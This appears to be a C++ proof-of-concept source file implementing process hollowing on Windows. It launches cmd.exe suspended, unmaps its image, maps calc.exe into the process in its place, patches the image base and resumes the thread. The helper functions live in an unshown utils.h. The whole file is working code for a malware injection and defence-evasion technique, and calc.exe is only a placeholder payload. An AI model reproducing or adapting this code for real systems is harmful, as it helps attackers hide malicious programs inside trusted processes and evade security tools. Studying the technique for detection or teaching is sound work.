#include <windows.h>
#include <memory>
#include <iostream>
#include "utils.h"

UINT processHollow();

int main() {
	UINT status = processHollow();
	return status;
}

UINT processHollow() { 
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	CONTEXT ctx;
	DWORD64 pebAddr = 0;
	LPSTR hollowedFile = (char*)"C:\\Windows\\System32\\cmd.exe";
	LPSTR targetFile = (char*)"C:\\Windows\\System32\\calc.exe";
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");

	PE_IMAGE pe_image{NULL , NULL};

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	PBYTE buffer = Utils::readFile(targetFile);
	if (!buffer) {
		Utils::Error("Failed read file");
	}

	if (!CreateProcessA(NULL, hollowedFile, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		Utils::Error("Failed create process");
	}

	auto safeHandle = std::make_unique<SafeHandle>(pi.hProcess, pi.hThread);

	ctx.ContextFlags = CONTEXT_INTEGER;
	if (!Utils::getContext(safeHandle.get()->getThread(), ctx)) {
		Utils::Error("Failed get context");
	}

	pebAddr = ctx.Rdx;
	std::optional<LPVOID> optionalImageBaseAddr = Utils::readProcessMemory(safeHandle.get()->getProcess(), pebAddr);
	if (!optionalImageBaseAddr) {
		return EXIT_FAILURE;
	}

	LPVOID imageBaseAddr = optionalImageBaseAddr.value();
	if (Utils::unmapProcess(ntdll, safeHandle.get()->getProcess(), imageBaseAddr) == EXIT_FAILURE) {
		return EXIT_FAILURE;
	}

	Utils::mapFile(safeHandle, buffer, imageBaseAddr, pe_image);
	if (!pe_image.address) {
		Utils::Error("Failed map file to memory");
	}

	if (!Utils::WriteImageBase(safeHandle, ctx, pe_image)) {
		Utils::Error("Failed write new image base");
	}

	if (!Utils::setContextAndResumeThread(safeHandle, ctx)) {
		Utils::Error("Failed set context or resume thread");
	}

	delete buffer;
	return EXIT_SUCCESS;
}